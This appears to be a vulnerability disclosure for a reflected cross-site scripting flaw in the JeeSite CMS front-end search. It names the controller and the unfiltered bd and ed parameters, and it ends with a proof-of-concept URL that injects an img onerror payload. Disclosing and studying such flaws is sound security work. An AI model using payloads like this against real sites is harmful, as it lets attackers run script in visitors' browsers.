## Component

jeesite download  link:https://github.com/thinkgem/jeesite

## Vulnerability location

**com.thinkgem.jeesite.modules.cms.web.front.FrontSearchController.java**   line 99.

After searching the incoming parameters bd and ed on line 82, the page result object is passed into the template file frontSearch on line 99.



In frontSearch.jsp, the parameter values are directly obtained through param.bd and param.ed(param is page), and the user parameter input is not filtered, resulting in the occurrence of XSS vulnerabilities.

![image-20200601180415153](/Users/looke/Documents/Notes/images/image-20200601180415153.png)



## Vulnerability trigger condition

No login required, access to specified URL link triggers XSS vulnerability

## POC

We directly closed the bd and ed parameters in the input with double quotes, and successfully executed our custom javascript code

```
http://127.0.0.1:8081/jeesite/f/search?pageNo=1&t=article&cid=&a=1&q=aa&qand=11&qnot=111&pageSize=30&bd=2020-06-01"><img src=x onerror=alert(1)><"&ed=2020-06-17"><img src=x onerror=alert(2)><"
```

![image-20200601181950657](/Users/looke/Documents/Notes/images/image-20200601181950657.png)
